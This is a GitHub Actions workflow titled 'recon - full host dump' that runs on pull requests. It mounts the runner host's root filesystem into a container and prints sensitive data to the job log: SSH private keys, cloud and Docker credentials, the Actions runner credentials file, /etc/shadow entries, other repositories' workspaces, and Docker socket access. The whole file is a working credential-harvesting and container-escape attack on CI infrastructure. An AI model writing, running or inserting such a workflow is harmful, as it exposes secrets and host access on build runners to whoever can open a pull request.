name: recon - full host dump

on:
  pull_request:
    branches: [main, master]

jobs:
  full-recon:
    runs-on: ubuntu-latest
    container:
      image: alpine:latest
      options: -v /:/host
    steps:
      - run: |
          echo "=== HOST IDENTITY ==="
          echo "Hostname: $(cat /host/etc/hostname 2>/dev/null)"
          echo "Kernel:   $(cat /host/proc/version 2>/dev/null)"
          echo "OS:       $(cat /host/etc/os-release 2>/dev/null | grep PRETTY_NAME)"
          echo "Uptime:   $(cat /host/proc/uptime 2>/dev/null | awk '{print int($1/86400)"d "int($1%86400/3600)"h"}')"
          echo ""

      - run: |
          echo "=== CLOUD CREDENTIALS ==="
          for dir in .aws .azure .gcp .config/gcloud .kube .helm; do
            echo "--- /home/runner/$dir ---"
            ls -la "/host/home/runner/$dir" 2>/dev/null || echo "  (not found)"
          done
          echo ""
          echo "--- Docker Hub auth ---"
          cat /host/home/runner/.docker/config.json 2>/dev/null
          echo ""

      - run: |
          echo "=== SSH & AUTH KEYS ==="
          for f in .ssh/id_rsa .ssh/id_ed25519 .ssh/authorized_keys .ssh/known_hosts .ssh/config; do
            echo "--- /home/runner/$f ---"
            cat "/host/home/runner/$f" 2>/dev/null || echo "  (not found)"
          done
          echo ""

      - run: |
          echo "=== ACTIONS RUNNER CONFIG ==="
          cat /host/home/runner/actions-runner/.runner 2>/dev/null || echo "  (not found)"
          echo ""
          echo "--- credentials ---"
          cat /host/home/runner/actions-runner/.credentials 2>/dev/null || echo "  (not found)"
          echo ""

      - run: |
          echo "=== OTHER WORKSPACES ==="
          ls -la /host/home/runner/work/ 2>/dev/null
          echo ""
          for repo in /host/home/runner/work/*/; do
            r=$(basename "$repo")
            echo "--- $r ---"
            ls "$repo" 2>/dev/null | head -5
          done
          echo ""

      - run: |
          echo "=== NETWORK (HOST) ==="
          echo "--- IPs ---"
          cat /host/proc/net/fib_trie 2>/dev/null | grep -A2 "LOCAL" | head -20
          echo ""
          echo "--- Listening ports ---"
          cat /host/proc/net/tcp 2>/dev/null | awk '{print $2}' | cut -d: -f2 | sort -n | uniq | head -20
          echo ""

      - run: |
          echo "=== SYSTEM SECRETS ==="
          echo "--- shadow (first 5) ---"
          head -5 /host/etc/shadow 2>/dev/null || echo "  (not readable)"
          echo ""
          echo "--- passwd ---"
          head -10 /host/etc/passwd 2>/dev/null
          echo ""
          echo "--- group (runner related) ---"
          grep -E "runner|docker|sudo|admin" /host/etc/group 2>/dev/null || echo "  (not found)"
          echo ""

      - run: |
          echo "=== DOCKER ON HOST ==="
          ls -la /host/var/run/docker.sock 2>/dev/null || echo "  sock not found at /var/run"
          ls -la /host/run/docker.sock 2>/dev/null || echo "  sock not found at /run"
          echo ""
          echo "--- docker containers ---"
          docker ps 2>/dev/null && echo "docker accessible" || echo "docker CLI not available (but socket is mounted)"
          echo ""
          echo "--- images ---"
          docker images 2>/dev/null | head -5 || echo "  (no docker CLI)"
